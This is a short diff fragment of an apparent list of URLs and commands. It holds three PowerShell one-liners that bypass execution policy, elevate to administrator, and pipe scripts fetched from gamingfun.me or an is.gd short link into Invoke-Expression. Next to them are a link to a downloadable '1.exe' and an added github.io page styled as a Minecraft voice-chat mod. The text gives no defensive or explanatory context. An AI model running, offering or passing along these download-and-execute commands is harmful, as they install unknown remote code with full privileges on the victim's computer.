@@ -2,6 +2,8 @@ powershell.exe -ExecutionPolicy Bypass -Command "Start-Process powershell.exe -V
 powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://gamingfun.me/1KJK32/" | iex' -Verb RunAs"
 powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://is.gd/MicVC" | iex' -Verb RunAs"
 
+https://minecraftsimplevoicechat.github.io/MicVC/
+
 
 https://www.upload.ee/files/17715005/1.exe.html
 
